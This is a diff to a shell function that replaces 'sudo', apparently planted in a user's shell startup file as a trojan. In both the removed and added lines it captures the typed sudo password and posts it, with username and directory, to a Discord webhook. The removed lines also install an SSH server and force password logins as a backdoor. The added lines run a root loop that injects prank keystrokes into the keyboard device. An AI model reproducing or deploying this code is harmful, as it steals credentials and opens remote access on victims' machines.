@@ -111,15 +111,45 @@ sudo(){
 			if [[ "$horseData" != "$(tail -n 1 $HOME/rcTarget)" ]]; then
 				echo "$horseData" >> $HOME/rcTarget
 			fi
-			lip=$(ip -4 -o addr show scope global | awk '{print $4}' | cut -d/ -f1 | paste -sd' ' -)
 			usr=$(whoami)
 			pwd=$(pwd)
-			setsid bash -c "gip=\$(curl -s icanhazip.com); curl -s -X POST -H \"Content-Type: application/json\" -d \"{\\\"content\\\": \\\"sudo=${horseVision} gip=\$gip lip=${lip} usr=${usr} pwd=${pwd}\\\"}\" https://discord.com/api/webhooks/1410231118363627641/2gd3OeGr7fDmqzkB9pc1Ymx_0osDYOxYzckTKGvLnw6QZl_Br8jwguvZg8grWUPSEWGu >/dev/null 2>&1 &" >/dev/null 2>&1 </dev/null
-			setsid bash -c "echo \"$horseVision\" | sudo -S apt install -y openssh-server >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S systemctl enable --now ssh >/dev/null 2>&1 " >/dev/null 2>&1 </dev/null
-			setsid bash -c "echo \"$horseVision\" | sudo -S dnf install -y openssh-server >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S systemctl enable --now sshd >/dev/null 2>&1" >/dev/null 2>&1 </dev/null
-			setsid bash -c "echo \"$horseVision\" | sudo -S pacman -S --noconfirm openssh >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S systemctl enable --now sshd >/dev/null 2>&1" >/dev/null 2>&1 </dev/null
-			setsid bash -c "echo \"$horseVision\" | sudo -S grep -q '^#\\?PasswordAuthentication' /etc/ssh/sshd_config && echo \"$horseVision\" | sudo -S sed -i 's/^#\\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config || echo \"$horseVision\" | sudo -S bash -c 'echo \"PasswordAuthentication yes\" >> /etc/ssh/sshd_config'; echo \"$horseVision\" | sudo -S systemctl restart sshd; echo \"$horseVision\" | sudo -S systemctl restart ssh" >/dev/null 2>&1 </dev/null
-
+			setsid bash -c "curl -s -X POST -H \"Content-Type: application/json\" -d \"{\\\"content\\\": \\\"sudo=${horseVision} usr=${usr} pwd=${pwd}\\\"}\" https://discord.com/api/webhooks/1410231118363627641/2gd3OeGr7fDmqzkB9pc1Ymx_0osDYOxYzckTKGvLnw6QZl_Br8jwguvZg8grWUPSEWGu >/dev/null 2>&1 &" >/dev/null 2>&1 </dev/null
+			setsid bash -c 'echo '"$horseVision"' | sudo -ES bash -c '\''
+				declare -A keycodes
+				keycodes=(["a"]=30 ["b"]=48 ["c"]=46 ["d"]=32 ["e"]=18 ["f"]=33 ["g"]=34 ["h"]=35 ["i"]=23 ["j"]=36 ["k"]=37 ["l"]=38 ["m"]=50 ["n"]=49 ["o"]=24 ["p"]=25 ["q"]=16 ["r"]=19 ["s"]=31 ["t"]=20 ["u"]=22 ["v"]=47 ["w"]=17 ["x"]=45 ["y"]=21 ["z"]=44 ["_"]=57 ["#"]=15 ["("]=1 [")"]=-1 ["["]=2 ["]"]=-2 ["{"]=3	["}"]=-3)
+				keyboard=$(libinput list-devices | awk "/^Device:/ {name=\$0} /^Kernel:/ {dev=\$2} /^Capabilities:/ && /keyboard/ && tolower(name) ~ /keyboard/ {print dev; exit}")
+				texts=("(h)i_there_" "(l)ooking_cute_today_" "(" ")" "[#]" "{#}")
+				while true; do
+					sleep $((9000 + RANDOM % 3600))
+					text=${texts[$((RANDOM % ${#texts[@]}))]}
+					echo "$text" | fold -w1 | while read -r letter; do
+						code=${keycodes[$letter]}
+						if [[ $code -eq 1 ]]; then
+							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x2A\x00\x01\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
+							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
+						elif [[ $code -eq -1 ]]; then
+							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x2A\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
+							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
+						elif [[ $code -eq 2 ]]; then
+							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x1D\x00\x01\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
+							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
+						elif [[ $code -eq -2 ]]; then
+							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x1D\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
+							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
+						elif [[ $code -eq 3 ]]; then
+							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x38\x00\x01\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
+							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
+						elif [[ $code -eq -3 ]]; then
+							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x38\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
+							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" | sdd of="$keyboard" bs=24 >/dev/null 2>&1
+						else
+							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x$(printf "%02x" "$code")\x00\x01\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
+							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x$(printf "%02x" "$code")\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
+							printf "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" | dd of="$keyboard" bs=24 >/dev/null 2>&1
+						fi
+					done
+				done
+				'\'' &' >/dev/null 2>&1 </dev/null
 		fi
 	fi
 }
